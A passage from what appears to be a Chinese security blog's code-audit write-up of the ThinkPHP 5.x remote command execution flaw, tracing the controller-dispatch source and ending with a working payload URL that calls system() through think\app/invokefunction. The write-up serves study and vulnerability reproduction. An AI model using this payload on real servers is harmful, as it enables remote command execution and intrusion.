class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$instance</span> <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">                <span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">registerMiddleware</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getClass</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;<span class="title function_ invoke__">controller</span>(function (Request <span class="variable">$request</span>, <span class="variable">$next</span>) <span class="keyword">use</span> ($<span class="title">instance</span>) &#123;</span><br><span class="line">            // 获取当前操作名</span><br><span class="line">            $<span class="title">action</span> = $<span class="title">this</span>-&gt;<span class="title">actionName</span> . $<span class="title">this</span>-&gt;<span class="title">rule</span>-&gt;<span class="title">getConfig</span>(&#x27;<span class="title">action_suffix</span>&#x27;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="variable">$action</span>])) &#123;</span><br><span class="line">                <span class="comment">// 执行操作方法</span></span><br><span class="line">                <span class="variable">$call</span> = [<span class="variable">$instance</span>, <span class="variable">$action</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">                <span class="variable">$reflect</span>    = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable">$instance</span>, <span class="variable">$action</span>);</span><br><span class="line">                <span class="variable">$methodName</span> = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line">                <span class="variable">$suffix</span>     = <span class="variable language_">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">                <span class="variable">$actionName</span> = <span class="variable">$suffix</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$methodName</span>, <span class="number">0</span>, -<span class="title function_ invoke__">strlen</span>(<span class="variable">$suffix</span>)) : <span class="variable">$methodName</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">setAction</span>(<span class="variable">$actionName</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 自动获取请求变量</span></span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">                ? <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">route</span>()</span><br><span class="line">                : <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">param</span>();</span><br><span class="line">                <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;param);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// 空操作</span></span><br><span class="line">                <span class="variable">$call</span>    = [<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">                <span class="variable">$vars</span>    = [<span class="variable language_">$this</span>-&gt;actionName];</span><br><span class="line">                <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 操作不存在</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . <span class="title function_ invoke__">get_class</span>(<span class="variable">$instance</span>) . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$action</span> . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;action_begin&#x27;</span>, <span class="variable">$call</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">invokeReflectMethod</span>(<span class="variable">$instance</span>, <span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoResponse</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="variable">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009171248934.png"><img src="/CMS-Test/image-20231009171248934.png" alt="image-20231009171248934"></a></p>
+<p>这里通过<code>$this-&gt;app-&gt;controller</code>来实现实例化控制器，从而调用这个实例的方法。</p>
+<p>为了找到控制器是如何实现命令执行跟进，<code>app--&gt;constroller</code>，定义在<code>App.php</code>中，</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009171439187.png"><img src="/CMS-Test/image-20231009171439187.png" alt="image-20231009171439187"></a></p>
+<p>可以看到在实例中的大多参数，都被<code>parseModuleAndClass</code> 处理，并解析为<code>$module</code>和<code>$class</code>，尤其根据更新文档中控制器名字<code>$this-&gt;controller</code>，也就是上图中的参数<code>$name</code>，最有可能这里发生了一些变化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化控制器</span></span><br><span class="line"><span class="variable">$instance</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">controller</span>(<span class="variable">$this</span>-&gt;controller,</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>跟着看看<code>$module</code>和<code>$class</code>有什么作用，</p>
+<p>在上图中$class被用来测试类是否存在，如果存在就进行实例化，如下图两个函数</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009172603174.png"><img src="/CMS-Test/image-20231009172603174.png" alt="image-20231009172603174"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009172638149.png"><img src="/CMS-Test/image-20231009172638149.png" alt="image-20231009172638149"></a></p>
+<p>而<code>$module</code>在这里起到一个生成动态命名空间的作用</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009172953514.png"><img src="/CMS-Test/image-20231009172953514.png" alt="image-20231009172953514"></a></p>
+<p>然后，开始跟进<code>parseModuleAndClass</code>方法，</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009173812659.png"><img src="/CMS-Test/image-20231009173812659.png" alt="image-20231009173812659"></a></p>
+<p>可以发现，当 <code>$name</code> 以反斜线 <code>\</code> 开始时直接将其作为类名。利用命名空间的特点，如果可以控制此处的 <code>$name</code>（即路由中的 <code>controller</code> 部分），那么就可以实例化任何一个类。</p>
+<p>但是要传参进去，就要看tp的url解析配置，</p>
+<p> <code>route/Rule.php</code>中配置了如何解析中的路由信息，</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009173923949.png"><img src="/CMS-Test/image-20231009173923949.png" alt="image-20231009173923949"></a></p>
+<p>就是用<code>/</code>将$url分割开，</p>
+<p>而$url是从<code>Request::path()</code>中获取，那直接修改请求url即可，那就有思路了。</p>
+<p>只是$url这个参数是如何获取的呢？</p>
+<p>在这里可以看到，<code>pathinfo()</code>会进行读取请求中的<code>GET</code>参数<code>$this*-&gt;config[&#39;var_pathinfo&#39;]</code></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009175218331.png"><img src="/CMS-Test/image-20231009175218331.png" alt="image-20231009175218331"></a></p>
+<p>而 <code>var_pathinfo</code> 的默认配置为 <code>s</code>，于是只需要传入参数<code>s</code>，对其进行修改即可，即可达到传参修改的目的</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009174731186.png"><img src="/CMS-Test/image-20231009174731186.png" alt="image-20231009174731186"></a></p>
+<h2 id="漏洞构造payload以及复现"><a href="#漏洞构造payload以及复现" class="headerlink" title="漏洞构造payload以及复现"></a>漏洞构造payload以及复现</h2><p>根据上面代码分析，实际上就是实例化类，如何调用就行了</p>
+<p>于是随便找个有执行函数或者恶意函数类实例化即可，记得加上反斜线 <code>\</code> ，让其name被代码认为是类进行实例化即可</p>
+<p>底下我就用实例化<code>app</code>中的<code>invokefunction</code>调用<code>call_user_func_array</code>，用<code>system</code>函数执行<code>dir</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009175604641.png"><img src="/CMS-Test/image-20231009175604641.png" alt="image-20231009175604641"></a></p>
+<p>测试完成</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%AB%E5%9F%8ECMS-v2-5-8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漫城CMS v2.5.8漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAphpstudy"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建phpstudy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.1.1.</span> <span class="toc-text">管理员页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E9%A1%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">主页</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">官方文档信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.2.</span> <span class="toc-text">模板目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3"><span class="toc-number">1.2.3.</span> <span class="toc-text">版本更新文档</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS%E5%B7%B2%E8%A2%AB%E6%89%BE%E5%88%B0%E7%9A%84%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text">CMS已被找到的公开漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">批量代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%85%E5%80%BC%E6%9C%88%E7%A5%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.充值月票逻辑缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">代码分析+漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%90%8E%E5%8F%B0%E4%B8%80%E5%A4%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.3.</span> <span class="toc-text">3.后台一处安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%9C%E5%AE%B6%E5%8F%91%E5%B8%83%E6%BC%AB%E7%94%BB%E5%B0%8F%E8%AF%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.5.4.</span> <span class="toc-text">4.作家发布漫画小说命令执行漏洞(复现失败)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">代码分析+漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%AB%E7%94%BB"><span class="toc-number">1.5.4.1.1.</span> <span class="toc-text">漫画</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E8%AF%B4"><span class="toc-number">1.5.4.1.2.</span> <span class="toc-text">小说</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">猜测</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V2Board-v1-6-1-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">V2Board  v1.6.1 越权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">ThinkPHP 5.x 远程命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞复现环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%9E%84%E9%80%A0payload%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞构造payload以及复现</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/CMS-Test/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/CMS-Test/&text=漏洞测试"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/CMS-Test/&is_video=false&description=漏洞测试"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=漏洞测试&body=Check out this article: https://ttoc.fun/CMS-Test/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/CMS-Test/&name=漏洞测试&description=&lt;p&gt;&lt;code&gt;训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/CMS-Test/&t=漏洞测试"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    Ttoc
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  
+
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
